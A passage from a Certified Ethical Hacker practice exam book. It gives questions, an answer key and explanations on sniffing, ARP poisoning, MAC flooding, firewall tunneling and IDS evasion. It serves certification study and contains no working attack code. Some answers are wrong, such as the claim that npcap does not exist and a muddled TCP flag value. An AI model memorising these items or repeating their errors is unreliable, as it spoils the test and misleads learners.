to the flags set in the segment, the source and destination addresses, and the protocols
listed. These items are easy to pick out for almost anyone who can spell, and they will
answer many of the questions you’ll see.

IDS types and ways to get around them won’t make up a gigantic portion of your
test, but they’ll definitely be there. These will most likely come in the form of scenario
questions, as opposed to straight definitions. While ECC loves fragmentation, session
splicing (with something like Whisker), and tunneling (HTTP or even TCP over DNS), just
remember there are other ways to get around an IDS, including generating “cover fire”
(that is, tons of false positives) and, of course, the ultimate in evasion—encryption. If the
traffic is encrypted, the IDS sees nothing.

Lastly, don’t forget your firewall types. You won’t see many questions on identifying
a definition, but you’ll probably see at least a couple of scenario questions where this
knowledge comes in handy—in particular, how stateful firewalls work and what they do.

CEH Certified Ethical Hacker Practice Exams

86

04-ch04.indd 86 11/04/22 11:42 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 4

QUESTIONS

1. Given the following Wireshark filter, what is the attacker attempting to view? Q
((tcp.flags == 0x02) || (tcp.flags == 0x12) ) ||
((tcp.flags == 0x10) && (tcp.ack==1) && (tcp.len==0) )

A. SYN, SYN/ACK, ACK

B. SYN, FIN, URG, and PSH

C. ACK, ACK, SYN, URG

D. SYN/ACK only

2. A target machine (with a MAC of 12:34:56:AB:CD:EF) is connected to a switch port.
An attacker (with a MAC of 78:91:00:ED:BC:A1) is attached to a separate port on the same
switch with a packet capture running. There is no spanning of ports or port security
in place. Two packets leave the target machine. Message 1 has a destination MAC of
E1:22:BA:87:AC:12. Message 2 has a destination MAC of FF:FF:FF:FF:FF:FF. Which of
the following statements is true regarding the messages being sent?

A. The attacker will see message 1.

B. The attacker will see message 2.

C. The attacker will see both messages.

D. The attacker will see neither message.

3. You have tapped into a network subnet of your target organization. You begin an attack
by learning all significant MAC addresses on the subnet. After some time, you decide to
intercept messages between two hosts. You send broadcast messages to Host A showing
your MAC address as belonging to Host B. What is being accomplished here?

A. ARP poisoning to allow you to see all messages from either host without interrupting
their communications process

B. ARP poisoning to allow you to see messages from Host A to Host B

C. ARP poisoning to allow you to see messages from Host B to Host A

D. ARP poisoning to allow you to see messages from Host A destined to any address

E. ARP poisoning to allow you to see messages from Host B destined to any address

4. Your target subnet is protected by a firewalled DMZ. Reconnaissance shows the external
firewall passes some traffic from external to internal, but blocks most communications.
HTTP traffic to a web server in the DMZ, which answers to www.somebiz.com, is
allowed, along with standard traffic such as DNS queries. Which of the following may
provide a method to evade the firewall’s protection?

A. An ACK scan

B. Firewalking

C. False positive flooding

D. TCP over DNS

Chapter 4: Sniffing and Evasion

87

04-ch04.indd 87 11/04/22 11:42 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 4

5. Which of the following is the best choice in setting an NIDS tap?

A. Connect directly to a server inside the DMZ.

B. Connect directly to a server in the intranet.

C. Connect to a SPAN port on a switch.

D. Connect to the console port of a router.

6. You have a large packet capture file in Wireshark to review. You want to filter traffic to
show all packets with an IP address of 192.168.22.5 that contain the string HR_admin.
Which of the following filters would accomplish this task?

A. ip.addr==192.168.22.5 &&tcp contains HR_admin

B. ip.addr 192.168.22.5 && “HR_admin”

C. ip.addr 192.168.22.5 &&tcp string ==HR_admin

D. ip.addr==192.168.22.5 + tcp contains tide

7. Which of the following techniques can be used to gather information from a fully switched
network or to disable some of the traffic isolation features of a switch? (Choose two.)

A. DHCP starvation

B. MAC flooding

C. Promiscuous mode

D. ARP spoofing

8. Which of the following statements is true regarding the discovery of sniffers on
a network?

A. To discover the sniffer, ping all addresses and examine the latency in responses.

B. To discover the sniffer, send ARP messages to all systems and watch for NOARP
responses.

C. To discover the sniffer, configure the IDS to watch for NICs in promiscuous mode.

D. It is almost impossible to discover the sniffer on the network.

9. Which of the following could provide a useful defense against ARP spoofing?
(Choose all that apply.)

A. Using ARPWALL

B. Setting all NICs to promiscuous mode

C. Using private VLANs

D. Using static ARP entries

10. Examine the following Snort rule:
alerttcp !$HOME_NET any -> $HOME_NET 23 (content:
"admin";msg:"Telnet attempt..admin access";)

CEH Certified Ethical Hacker Practice Exams

88

04-ch04.indd 88 11/04/22 11:42 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 4

Which of the following statements are true regarding the rule? (Choose all that apply.)

A. This rule will alert on packets coming from the designated home network.

B. This rule will alert on packets coming from outside the designated home address.

C. This rule will alert on packets designated for any port, from port 23, containing the
“admin” string.

D. This rule will alert on packets designated on port 23, from any port, containing the
“admin” string.

11. You want to begin sniffing, and you have a Windows laptop. You download and install
Wireshark but quickly discover your NIC needs to be in promiscuous mode. What allows
you to put your NIC into promiscuous mode?

A. Installing lmpcap

B. Installing npcap

C. Installing WinPcap

D. Installing libPcap

E. Manipulating the NIC properties through Control Panel | Network and Internet |
Change Adapter Settings

12. A network and security administrator installs an NIDS. After a few weeks, a successful
intrusion into the network occurs and a check of the NIDS during the timeframe of the
attack shows no alerts. An investigation shows the NIDS was not configured correctly
and therefore did not trigger on what should have been attack alert signatures. Which of
the following best describes the actions of the NIDS?

A. False positives

B. False negatives

C. True positives

D. True negatives

13. A pen test member has gained access to an open switch port. He configures his NIC for
promiscuous mode and sets up a sniffer, plugging his laptop directly into the switch port.
He watches traffic as it arrives at the system, looking for specific information to possibly
use later. What type of sniffing is being practiced?

A. Active

B. Promiscuous

C. Blind

D. Passive

E. Session

Chapter 4: Sniffing and Evasion

89

04-ch04.indd 89 11/04/22 11:42 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 4

14. Which of the following are the best preventive measures to take against DHCP starvation
attacks? (Choose two.)

A. Block all UDP port 67 and 68 traffic.

B. Enable DHCP snooping on the switch.

C. Use port security on the switch.

D. Configure DHCP filters on the switch.

15. Which of the following tools is the best choice to assist in evading an IDS?

A. Nessus

B. Nikto

C. Libwhisker

D. Snort

16. An attacker somehow manages to connect a rogue switch onto an enterprise network
segment. He configures the switch with a priority lower than any other on the network.
Assuming this attempt is successful, which of the following statements is true?

A. The rogue switch will cause broadcast loops and eventually DoS the segment.

B. The rogue switch will become the root bridge, allowing the attacker to sniff network
traffic.

C. DHCP will no longer function on the segment.

D. None of the above.

17. Your IDS sits on the network perimeter and has been analyzing traffic for a couple of
weeks. On arrival one morning, you find the IDS has alerted on a spike in network traffic
late the previous evening. Which type of IDS are you using?

A. Stateful

B. Snort

C. Passive

D. Signature based

E. Anomaly based

18. You are performing an ACK scan against a target subnet. You previously verified
connectivity to several hosts within the subnet but want to verify all live hosts on the
subnet. Your scan, however, is not receiving any replies. Which type of firewall is most
likely in use at your location?

A. Packet filtering

B. IPS

C. Stateful

D. Active

CEH Certified Ethical Hacker Practice Exams

90

04-ch04.indd 90 11/04/22 11:42 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 4

19. You are separated from your target subnet by a firewall. The firewall is correctly configured
and allows requests only to ports opened by the administrator. In firewalking the device,
you find that port 80 is open. Which technique could you employ to send data and
commands to or from the target system?

A. Encrypt the data to hide it from the firewall.

B. Use session splicing.

C. Use MAC flooding.

D. Use HTTP tunneling.

20. Which of the following tools can be used to extract Application layer data from TCP
connections captured in a log file into separate files?

A. Snort

B. Netcat

C. TCPflow

D. Tcpdump

21. Examine the Wireshark filter shown here:
ip.src == 192.168.1.1 &&tcp.srcport == 80

Which of the following correctly describes the capture filter?

A. The results will display all traffic from 192.168.1.1 destined for port 80.

B. The results will display all HTTP traffic to 192.168.1.1.

C. The results will display all HTTP traffic from 192.168.1.1.

D. No results will display because of invalid syntax.

22. You need to put the NIC into listening mode on your Linux box, capture packets, and
write the results to a log file named my.log. How do you accomplish this with tcpdump?

A. tcpdump -i eth0 -w my.log

B. tcpdump -l eth0 -c my.log

C. tcpdump /i eth0 /w my.log

D. tcpdump /l eth0 /c my.log

23. Which of the following tools can assist with IDS evasion? (Choose all that apply.)

A. Whisker

B. Fragroute

C. Capsa

D. Wireshark

E. ADMmutate

F. Inundator

Chapter 4: Sniffing and Evasion

91

04-ch04.indd 91 11/04/22 11:42 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 4

24. A security administrator is attempting to “lock down” her network and blocks access
from internal to external on all external firewall ports except for TCP 80 and TCP 443.
An internal user wants to make use of other protocols to access services on remote systems
(FTP, as well as some nonstandard port numbers). Which of the following is the most
likely choice the user could attempt to communicate with the remote systems over the
protocol of her choice?

A. Use HTTP tunneling.

B. Send all traffic over UDP instead of TCP.

C. Crack the firewall and open the ports required for communication.

D. MAC flood the switch connected to the firewall.

25. An ethical hacker is assigned to scan a server and wants to avoid IDS detection. She uses
a tactic wherein the TCP header is split into many packets, making it difficult to detect
what the packets are intended for. Which of the following best describes the technique
employed?

A. TCP scanning

B. IP fragment scanning

C. ACK scanning

D. Inverse TCP scanning

CEH Certified Ethical Hacker Practice Exams

92

04-ch04.indd 92 11/04/22 11:42 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 4

QUICK ANSWER KEY

1. A 10. B, D 19. D

2. B 11. C 20. C

3. B 12. B 21. C

4. D 13. D 22. A

5. C 14. B, C 23. A, B, E, F

6. A 15. C 24. A

7. B, D 16. B 25. B

8. D 17. E

9. A, C, D 18. C

Chapter 4: Sniffing and Evasion

93

04-ch04.indd 93 11/04/22 11:42 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 4

ANSWERS

A 1. Given the following Wireshark filter, what is the attacker attempting to view?
((tcp.flags == 0x02) || (tcp.flags == 0x12) ) ||
((tcp.flags == 0x10) && (tcp.ack==1) && (tcp.len==0) )

A. SYN, SYN/ACK, ACK

B. SYN, FIN, URG, and PSH

C. ACK, ACK, SYN, URG

D. SYN/ACK only

☑ A. You’ll see bunches of Wireshark questions on your exam—it’s probably the subject
EC-Council loves the most regarding this chapter—and syntax will be the key to
answering all of them. For this particular question subject, remember Wireshark has
the ability to filter based on a hexadecimal numbering system assigned to TCP flags.
The assigned flag hex numbers are FIN = 1, SYN = 2, RST = 4, PSH = 8, ACK = 16,
and URG = 32. Putting these hex numbers together (for example, SYN + ACK = 12)
allows you to simplify a Wireshark filter. For example, tcp.flags == 0x2 looks for
SYN packets, tcp.flags == 0x16 looks for ACK packets, and tcp.flags == 0x12
looks for both (the attacker here will see all SYN packets, all SYN/ACK packets,
and all ACK packets). In this example, the decimal numbers were used, just not in a
simplified manner.

As far as the rest of Wireshark filtering syntax goes, there are a couple key points
to remember. First, be sure to remember it uses double “equals” signs (==) in the
expression (ip.addr = 10.10.10.0/24 won’t work, but ip addr == 10.10.10.0/24
will). Next, know the difference between the definitions for “and” and “or.” An “and”
in the filter means both expressions will be queried and displayed, but only if both
are true. (In other words, “Show me all packets containing this source address and
headed toward this destination IP. If it’s from this source but going somewhere else,
ignore it. If it’s headed to this destination but is not from this source, ignore it.”)
An “or” in the filter means either of the expressions can be true (that is, “Show me all
packets containing this source address and any packets going to this destination IP,
no matter the destination or source address, respectively, for the two”).

☐✗ B, C, and D are incorrect because these do not match the decimal numbers provided
in the capture (2 for SYN, 18 for SYN/ACK, and 16 for ACK).

2. A target machine (with a MAC of 12:34:56:AB:CD:EF) is connected to a switch port.
An attacker (with a MAC of 78:91:00:ED:BC:A1) is attached to a separate port on the same
switch with a packet capture running. There is no spanning of ports or port security
in place. Two packets leave the target machine. Message 1 has a destination MAC of
E1:22:BA:87:AC:12. Message 2 has a destination MAC of FF:FF:FF:FF:FF:FF. Which of
the following statements is true regarding the messages being sent?

A. The attacker will see message 1.

B. The attacker will see message 2.

CEH Certified Ethical Hacker Practice Exams

94

04-ch04.indd 94 11/04/22 11:42 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 4

C. The attacker will see both messages.

D. The attacker will see neither message.

☑ B. This question is all about how a switch works, with a little MAC knowledge thrown
in. Remember that switches are designed to filter unicast messages but to flood
multicast and broadcast messages (filtering goes to only one port, whereas flooding
sends to all). Broadcast MAC addresses in the frame are easy to spot—they’re
always all Fs, indicating all 48 bits turned on in the address. In this case, message 1
is a unicast address and went off to its destination, whereas message 2 is clearly a
broadcast message, which the switch will gladly flood to all ports, including the
attacker’s.

Other versions of this same question will center on the efforts an attacker can use to
see that packet. Should the attacker desire to see all messages, a MAC flood could
turn the switch into a hub, effectively flooding all packets to all ports. Another
option is to span a port (break into the configuration of the switch and tell it to send
all traffic destined for a specific port to that port and to the attacker’s). Lastly, port
stealing (a totally fun memorization term from EC-Council) allows an attacker to
take advantage of the race condition (where the switch is constantly updating MAC
address bindings for ports) during a MAC flood attempt to effectively steal a port and
sniff all traffic aimed for the target machine.

☐✗ A is incorrect because the unicast destination MAC does not match the attacker’s
machine. When the frame is read by the switch and compared to the internal address
list (CAM table), it will be filtered and sent to the appropriate destination port.

☐✗ C is incorrect because the switch will not flood both messages to the attacker’s port—it
floods only broadcast and multicast.

☐✗ D is incorrect because the broadcast address will definitely be seen by the attacker.

3. You have tapped into a network subnet of your target organization. You begin an attack
by learning all significant MAC addresses on the subnet. After some time, you decide to
intercept messages between two hosts. You send broadcast messages to Host A showing
your MAC address as belonging to Host B. What is being accomplished here?

A. ARP poisoning to allow you to see all messages from either host without interrupting
their communications process

B. ARP poisoning to allow you to see messages from Host A to Host B

C. ARP poisoning to allow you to see messages from Host B to Host A

D. ARP poisoning to allow you to see messages from Host A destined to any address

E. ARP poisoning to allow you to see messages from Host B destined to any address

☑ B. ARP poisoning is a relatively simple way to place yourself as the “man in the
middle” and spy on traffic (by the way, be careful with the term man in the middle
because it usually refers to a position where you are not interrupting traffic). The
ARP cache is updated whenever your machine does a name lookup or when ARP

Chapter 4: Sniffing and Evasion

95

04-ch04.indd 95 11/04/22 11:42 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 4

(a broadcast protocol) receives an unsolicited message advertising a MAC-to-IP
match. In this example, you’ve told Host A that you hold the MAC address for
Host B. Host A will update its cache, and when a message is being crafted by the
OS, it will happily put the spoofed address in its place. Just remember that ARP
poisoning is oftentimes noisy and may be easy to discover if port security is enabled:
depending on implementation, the port will lock (or amber in nerd terminology)
when an incorrect MAC tries to use it or when multiple broadcasts claiming different
MACs are seen. Additionally, watch out for denial-of-service side effects of
attempting ARP poisoning—you may well bring down a target without even trying
to, not to mention Host B is eventually going to find out it’s not receiving anything
from Host A. As a side note, detection of ARP poisoning can be done with a tool
called xARP (www.chrismc.de).

☐✗ A is incorrect for a couple reasons. First, you won’t receive messages from each host
addressed to anywhere in the world—you’ll only receive messages addressed from
Host A to Host B. Second, the communications flow between the two hosts will
be affected by this. As a matter of fact, Host A can never talk to Host B: the ARP
poisoning has all messages going to you, the hacker.

☐✗ C is incorrect because you didn’t poison Host B’s cache—Host A was the target.

☐✗ D is incorrect because you didn’t poison Host A’s mapping to the default gateway or
anything like that—you will only receive messages intended for Host B.

☐✗ E is incorrect because you did not poison Host B at all.

4. Your target subnet is protected by a firewalled DMZ. Reconnaissance shows the external
firewall passes some traffic from external to internal, but blocks most communications.
HTTP traffic to a web server in the DMZ, which answers to www.somebiz.com, is
allowed, along with standard traffic such as DNS queries. Which of the following may
provide a method to evade the firewall’s protection?

A. An ACK scan

B. Firewalking

C. False positive flooding

D. TCP over DNS

☑ D. Of the choices provided, TCP over DNS is the only one that makes any sense.
TCP over DNS is exactly what it sounds like—sending TCP traffic that would
otherwise use a different port number in packets using port 53. Because the firewall
usually allows DNS requests to pass, hiding traffic under port 53 is convenient and
fairly easy. The whole thing does require a special DNS server and DNS client setup,
but the steps to pull it off aren’t rocket science. While TCP over DNS will allow you
to evade the firewall and send traffic internally, it will not provide you instant access to
machines or anything like that—it simply allows you to send traffic unnoticed through

CEH Certified Ethical Hacker Practice Exams

96

04-ch04.indd 96 11/04/22 11:42 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 4

a firewall. TCP over DNS tools include Iodine (http://code.kryo.se/iodine/), DNS
Tunnel (http://dnstunnel.de), and Netcross (https://sourceforge.net/projects/netcross).

Another very common option for passing traffic through a firewall is HTTP tunneling.
The same principle applies, except in HTTP tunneling you abuse port 80 instead of
port 53. HTTP tunneling tools include HTTPort (www.targeted.org), SuperNetwork
Tunnel (networktunnel.net), and HTTP-Tunnel (www.http-tunnel.com).

☐✗ A is incorrect because an ACK scan does nothing to hide traffic or evade the firewall.
The scan itself would be loud and noisy, and it would not affect the firewall at all.

☐✗ B is incorrect because firewalking is a great technique to discover which ports are
open (that is, which ports the firewall is allowing to pass) and which are closed.
However, it does nothing to hide traffic or evade any suspicion.

☐✗ C is incorrect because while false positive flooding does provide good “cover fire”
for an attacker in an IDS, it does nothing to affect the firewall in any way—traffic to
other ports will be blocked because that’s just what a firewall does.

5. Which of the following is the best choice in setting an NIDS tap?

A. Connect directly to a server inside the DMZ.

B. Connect directly to a server in the intranet.

C. Connect to a SPAN port on a switch.

D. Connect to the console port of a router.

☑ C. A network intrusion detection system (NIDS) only works well if it can see all the
network traffic, and placement obviously makes a huge difference. One common
implementation is to connect via a SPAN (Switched Port Analyzer) port on a switch.
The configuration for a SPAN port ensures all traffic from a defined range of ports is
also sent to the SPAN port. This makes the best option for your NIDS tap, at least as
far as this question goes: in the real world, you would most likely set up a passive tap,
positioned in the correct location to see everything coming across the wire.

☐✗ A is incorrect because connecting directly to a single server would give you only the
traffic sent to that server (or that server’s subnet, provided the server is watching
promiscuously and is configured appropriately). In this case, the DMZ’s traffic is all
you’d see.

☐✗ B is incorrect because connecting directly to a single server would give you only
the traffic sent to that server (or that server’s subnet, provided the server is watching
promiscuously and is configured appropriately). In this case, the intranet’s traffic is all
you’d see.

☐✗ D is incorrect because connecting to the console port on a router would provide
access to no traffic at all. The console port on the router is used specifically for
configuration and management of the router.

Chapter 4: Sniffing and Evasion

97

04-ch04.indd 97 11/04/22 11:42 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 4

6. You have a large packet capture file in Wireshark to review. You want to filter traffic to
show all packets with an IP address of 192.168.22.5 that contain the string HR_admin.
Which of the following filters would accomplish this task?

A. ip.addr==192.168.22.5 &&tcp contains HR_admin

B. ip.addr 192.168.22.5 && “HR_admin”

C. ip.addr 192.168.22.5 &&tcp string ==HR_admin

D. ip.addr==192.168.22.5 + tcp contains tide

☑ A. This is a perfect example of a typical question on your exam regarding Wireshark
syntax. Answer A is the only one that sticks to Wireshark filter syntax. Definitely
know the ip.addr, ip.src, and ip.dst filters; the “tcp contains” filter is another favorite
of test question writers. When you combine filters in one search, use the &&
designator, and don’t forget the use of double equals signs. Another fun version of
this same question involves reading the output from Wireshark. A tool that can help
you out with the raw files—including output from other tools like tcpdump—is
tcptrace (www.tcptrace.org/).

☐✗ B, C, and D are all incorrect because the syntax is wrong for Wireshark filters. As an
aside, a great way to learn the syntax of these filters is to use the expression builder
directly beside the filter entry box. It’s self-explanatory and contains thousands of
possible expression builds.

7. Which of the following techniques can be used to gather information from a fully switched
network or to disable some of the traffic isolation features of a switch? (Choose two.)

A. DHCP starvation

B. MAC flooding

C. Promiscuous mode

D. ARP spoofing

☑ B, D. Switches filter all traffic—unless you tell them otherwise, make them behave
differently, or the traffic is broadcast or multicast. If you can gain administrative
access to the IOS, you can tell it to behave otherwise by configuring a span port
(which sends copies of messages from all ports to yours). Legitimate span ports are
designed for things such as a network IDS. To make the switch behave differently
(at least on older switches, because newer ones don’t allow this much anymore), send
more MAC addresses to the switch than it can handle. This fills the CAM and turns
the switch, effectively, into a hub (sometimes called a fail open state). Using a tool
such as MacOF or Yersinia, you can send thousands and thousands of fake MAC
addresses to the switch’s CAM table. ARP spoofing doesn’t really involve the switch
much at all—it continues to act and filter traffic just as it was designed to do. The
only difference is you’ve lied to it by faking a MAC address on a connected port.

CEH Certified Ethical Hacker Practice Exams

98

04-ch04.indd 98 11/04/22 11:42 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 4

The poor switch, believing those happy little ARP messages, will forward all packets
destined for that MAC address to you instead of the intended recipient. How fun!

☐✗ A is incorrect because DHCP starvation is a form of a DoS attack, where the attacker
“steals” all the available IP addresses from the DHCP server, which prevents legitimate
users from connecting.

☐✗ C is incorrect because the term promiscuous applies to the way a NIC processes messages.
Instead of tossing aside all messages that are not addressed specifically for the machine
(or broadcast/multicast), promiscuous mode says, “Bring ’em all in so we can take
a look at them using our handy sniffing application.”

8. Which of the following statements is true regarding the discovery of sniffers on a network?

A. To discover the sniffer, ping all addresses and examine the latency in responses.

B. To discover the sniffer, send ARP messages to all systems and watch for NOARP
responses.

C. To discover the sniffer, configure the IDS to watch for NICs in promiscuous mode.

D. It is almost impossible to discover the sniffer on the network.

☑ D. This question is more about active versus passive sniffing than anything else. I’m
not saying it’s impossible, because almost nothing is, but discovering a passive sniffer
on your network is very difficult. When a NIC is set to promiscuous mode, it just
blindly accepts any packet coming by and sends it up the layers for further processing
(which is what allows Wireshark and other sniffers to analyze the traffic). Because
sniffers are sitting there pulling traffic and not sending anything in order to get it,
they’re difficult to detect. Active sniffing is another thing altogether. If a machine is
ARP spoofing or MAC flooding in order to pull off sniffing, it’s much easier to spot it.

☐✗ A is incorrect because the premise is absolutely silly. Thousands of things can affect
latency in response to a ping, but running a sniffer on the box isn’t necessarily one of
them, nor is latency an indicator of one being present.

☐✗ B is incorrect because NOARP is a Linux kernel module that filters and drops
unwanted ARP requests. It’s not a response packet we can discover sniffers with.

☐✗ C is incorrect because it’s impossible to watch for NICs in promiscuous mode. The
NIC is simply doing the same job every other NIC is doing—it’s sitting there pulling
traffic. The network IDS wouldn’t know, or care, about it.

9. Which of the following could provide a useful defense against ARP spoofing?
(Choose all that apply.)

A. Using ARPWALL

B. Setting all NICs to promiscuous mode

C. Using private VLANs

D. Using static ARP entries

Chapter 4: Sniffing and Evasion

99

04-ch04.indd 99 11/04/22 11:42 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 4

☑ A, C, D. ARPWALL is an application available for download from SourceForge
(http://sourceforge.net/projects/arpwall/). It gives an early warning when an ARP
attack occurs and simply blocks the connection. Virtual LANs (VLANs) provide a
means to create multiple broadcast domains within a single network. Machines on
the same switch are in different networks, and their traffic is isolated. Since ARP
works on broadcast, this can help prevent large-scale ARP spoofing. Per courseware,
static ARP entries are a good idea and at least one way to fix ARP poisoning, since
no matter what is banging around out on the network, the system uses the static
mapping you configured. An IDS may also be helpful in spotting ARP shenanigans,
but it wouldn’t necessarily do anything about them.

☐✗ B is incorrect because setting NICs to promiscuous mode wouldn’t do a thing to
prevent a broadcast message (ARP) from being received.

10. Examine the following Snort rule:
alerttcp !$HOME_NET any -> $HOME_NET 23 (content:
"admin";msg:"Telnet attempt..admin access";)

Which of the following statements are true regarding the rule? (Choose all that apply.)

A. This rule will alert on packets coming from the designated home network.

B. This rule will alert on packets coming from outside the designated home address.

C. This rule will alert on packets designated for any port, from port 23, containing the
“admin” string.

D. This rule will alert on packets designated on port 23, from any port, containing the
“admin” string.

☑ B, D. Snort rules, logs, entries, and configuration files will definitely be part of your
exam. This particular rule takes into account a lot of things you’ll see. First, note the
exclamation mark (!) just before the HOME_NET variable. Any time you see this,
it indicates the opposite of the following variable—in this case, any packet from an
address not in the home network and using any source port number, intended for any
address that is within the home network. Following that variable is a spot for a port
number, and the word any indicates we don’t care what the source port is. Next, we
spell out the destination information: anything in the home network and destined
for port 23. Finally, we add one more little search before spelling out the message we
want to receive: the “content” designator allows us to spell out strings we’re looking for.

☐✗ A and C are incorrect because these statements are polar opposite to what the rule is
stating.

11. You want to begin sniffing, and you have a Windows laptop. You download and install
Wireshark but quickly discover your NIC needs to be in promiscuous mode. What allows
you to put your NIC into promiscuous mode?

A. Installing lmpcap

B. Installing npcap

CEH Certified Ethical Hacker Practice Exams

100

04-ch04.indd 100 11/04/22 11:42 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 4

C. Installing WinPcap

D. Installing libPcap

E. Manipulating the NIC properties through Control Panel | Network and Internet |
Change Adapter Settings

☑ C. To understand this, you have to know how a NIC is designed to work. The NIC
“sees” lots of traffic but pulls in only the traffic it knows belongs to you. It does this
by comparing the MAC address of each frame against its own: if they match, it pulls
the frame in and works on it; if they don’t match, the frame is ignored. If you plug
a sniffer into a NIC that looks only at traffic designated for the machine you’re on,
you’ve kind of missed the point, wouldn’t you say? Promiscuous mode tells the NIC
to pull in everything. This allows you to see all those packets moving to and fro inside
your collision domain. WinPcap is a library that allows NICs on Windows machines
to operate in promiscuous mode.

☐✗ A is incorrect because lmpcap does not exist.

☐✗ B is incorrect because npcap does not exist.

☐✗ D is incorrect because libPcap is used on Linux machines for the same purpose—
putting cards into promiscuous mode.

☐✗ E is incorrect because accessing the Change Adapter Settings window does not allow
you to put the card into promiscuous mode—you still need WinPcap for this.

12. A network and security administrator installs an NIDS. After a few weeks, a successful
intrusion into the network occurs and a check of the NIDS during the timeframe of the
attack shows no alerts. An investigation shows the NIDS was not configured correctly
and therefore did not trigger on what should have been attack alert signatures. Which of
the following best describes the actions of the NIDS?

A. False positives

B. False negatives

C. True positives

D. True negatives

☑ B. When it comes to alerting systems, false negatives are much more concerning than
false positives. A false negative occurs when traffic and circumstances are in place
for an attack signature, but the IDS does not trigger an alert. In other words, if your
system is firing a lot of false negatives, the security staff may feel like they’re secure
when, in reality, they’re really under a successful attack. Keep in mind a false negative
is different from your IDS simply not seeing the traffic. For example, if you tell
your IDS to send an alert for Telnet traffic and it simply didn’t see those packets (for
whatever reason), that may be a false negative for exam purposes but in the real world

Chapter 4: Sniffing and Evasion

101

04-ch04.indd 101 11/04/22 11:42 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 4

is probably more of a configuration issue. A better example of a false negative in the
real world would be for the attacker to encrypt a portion of a payload so that the IDS
doesn’t recognize it as suspicious. In other words, the IDS sees the traffic, but it just
doesn’t recognize anything bad about it.

☐✗ A is incorrect because false positives occur when legitimate traffic is alerted on as
if something was wrong with it. Keeping false positives to a minimum is a concern
when choosing and configuring an IDS.

☐✗ C and D are incorrect because these are not legitimate terms.

13. A pen test member has gained access to an open switch port. He configures his NIC for
promiscuous mode and sets up a sniffer, plugging his laptop directly into the switch port.
He watches traffic as it arrives at the system, looking for specific information to possibly
use later. What type of sniffing is being practiced?

A. Active

B. Promiscuous

C. Blind

D. Passive

E. Session

☑ D. This is one of those weird CEH definitions that drive us all crazy on the exam.
Knowing the definition of passive versus active isn’t really going to make you a better
pen tester, but it may save you a question on the test. When it comes to sniffing,
if you are not injecting packets into the stream, it’s a passive exercise. Tools such as
Wireshark are passive in nature. A tool such as Ettercap, though, has built-in features
to trick switches into sending all traffic its way, and other sniffing hilarity. This type
of sniffing, where you use packet interjection to force a response, is active in nature.
As a quick aside here, for you real-world preppers out there, true passive sniffing with
a laptop is pretty difficult to pull off. As soon as you attach a Windows machine, it’ll
start broadcasting all kinds of stuff (ARP and so on), which is, technically, putting
packets on the wire. The real point is that passive sniffing is a mindset where you are
not intentionally putting packets on a wire.

☐✗ A is incorrect because in the example given, no packet injection is being performed.
The pen tester is simply hooking up a sniffer and watching what comes by. The only
way this can be more passive is if he has a hammock nearby.

☐✗ B is incorrect because the term promiscuous is not a sniffing type. Instead, it refers to
the NIC’s ability to pull in frames that are not addressed specifically for it.

☐✗ C is incorrect because the term blind is not a sniffing type. This is included as a
distractor.

☐✗ E is incorrect because the term session is not a sniffing type. This is included as a
distractor.

CEH Certified Ethical Hacker Practice Exams

102

04-ch04.indd 102 11/04/22 11:42 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 4

14. Which of the following are the best preventive measures to take against DHCP starvation
attacks? (Choose two.)

A. Block all UDP port 67 and 68 traffic.

B. Enable DHCP snooping on the switch.

C. Use port security on the switch.

D. Configure DHCP filters on the switch.

☑ B, C. DHCP starvation is a denial-of-service attack EC-Council somehow slipped
into the sniffing section. The attack is pretty straightforward: the attacker requests all
available DHCP addresses from the server, so legitimate users cannot pull an address
and connect or communicate with the network subnet. DHCP snooping on a Cisco
switch (using the ip dhcp snooping command) creates a whitelist of machines that
are allowed to pull a DHCP address. Anything attempting otherwise can be filtered.
Port security, while not necessarily directly related to the attack, can be a means of
defense as well. By limiting the number of MACs associated with a port, as well
as whitelisting which specific MACs can address it, you could certainly reduce an
attacker’s ability to drain all DHCP addresses.

As a side note, you may also see a question relating to how DHCP works in the first
place. An easy way to remember it all is with the acronym DORA: Discover, Offer,
Request, and Acknowledge. Additionally, packets in DHCPv6 have different names
than those of DHCPv4. DHCPDISCOVER, DHCPOFFER, DHCPREQUEST,
and DHCPACK are known as Solicit, Advertise, Request (or Confirm/Renew), and
Reply, respectively.

☐✗ A is incorrect because blocking all UDP 67 and 68 traffic would render the entire
DHCP system moot because no one could pull an address.

☐✗ D is incorrect because DHCP filtering is done on the server and not the switch.
DHCP filtering involves configuring the whitelist on the server itself.

15. Which of the following tools is the best choice to assist in evading an IDS?

A. Nessus

B. Nikto

C. Libwhisker

D. Snort

☑ C. It’s a hallmark of EC-Council certification exams to have a few off-the-wall, tool-
specific questions, and this is a great example. Libwhisker (https://sourceforge.net/
projects/whisker/) is a full-featured Perl library used for a number of things, including
